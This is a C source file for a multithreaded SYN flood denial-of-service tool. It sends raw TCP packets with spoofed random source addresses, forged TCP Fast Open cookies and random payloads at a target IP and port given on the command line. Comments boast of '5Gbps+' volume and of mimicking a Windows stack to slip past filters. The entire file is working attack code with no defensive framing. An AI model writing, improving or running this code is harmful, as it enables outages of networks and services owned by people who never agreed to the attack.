#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>

#define PACKET_SIZE 1300 // Maximum volumetric weight for 5Gbps+

struct target_info {
    char *ip;
    int port;
    int duration;
};

struct pseudo_header {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
};

unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte, answer;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    return (short)~sum;
}

void *syn_flood(void *parm) {
    struct target_info *info = (struct target_info *)parm;
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    
    char datagram[4096];
    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct iphdr));
    
    // TCP Options area for TFO Spoofing
    unsigned char *options = (unsigned char *)(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr));
    unsigned char *data = options + 12; // Data follows options

    struct sockaddr_in sin;
    struct pseudo_header psh;

    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    sin.sin_family = AF_INET;
    sin.sin_port = htons(info->port);
    sin.sin_addr.s_addr = inet_addr(info->ip);

    // High-Entropy Payload
    for(int i=0; i < 1000; i++) data[i] = rand() % 255;

    time_t start_time = time(NULL);
    while (time(NULL) < start_time + info->duration) {
        memset(datagram, 0, sizeof(struct iphdr) + sizeof(struct tcphdr) + 12);

        iph->ihl = 5;
        iph->version = 4;
        iph->tot_len = PACKET_SIZE;
        iph->id = htons(rand() % 65535);
        iph->ttl = 128; // Mimic Windows stack
        iph->protocol = IPPROTO_TCP;
        iph->saddr = inet_addr(inet_ntoa((struct in_addr){random()}));
        iph->daddr = sin.sin_addr.s_addr;

        tcph->source = htons(rand() % 65535);
        tcph->dest = htons(info->port);
        tcph->seq = rand();
        tcph->doff = 8; // Offset increased to 8 to include 12 bytes of options
        tcph->syn = 1;
        tcph->window = htons(65535);
        
        // --- TFO COOKIE SPOOFING (TCP OPTION 34) ---
        options[0] = 34; // Kind: TFO
        options[1] = 10; // Length: 10
        for(int i=2; i<10; i++) options[i] = rand() % 255; // Random 8-byte cookie
        options[10] = 1; // NOP
        options[11] = 1; // NOP

        tcph->check = 0;
        psh.source_address = iph->saddr;
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr) + 12 + (PACKET_SIZE - sizeof(struct iphdr) - sizeof(struct tcphdr) - 12));

        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + 12 + (PACKET_SIZE - sizeof(struct iphdr) - sizeof(struct tcphdr) - 12);
        char *pseudogram = malloc(psize);
        memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, psize - sizeof(struct pseudo_header));
        tcph->check = checksum((unsigned short*)pseudogram, psize);

        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        free(pseudogram);
    }
    close(s);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
        return 1;
    }
    struct target_info info = {argv[1], atoi(argv[2]), atoi(argv[3])};
    int thread_count = atoi(argv[4]);
    pthread_t threads[thread_count];

    printf("[⚡] EXECUTING SINGULARITY-LEVEL FLOOD: %s:%d\n", info.ip, info.port);
    for (int i = 0; i < thread_count; i++) pthread_create(&threads[i], NULL, &syn_flood, (void *)&info);
    for (int i = 0; i < thread_count; i++) pthread_join(threads[i], NULL);
    return 0;
}
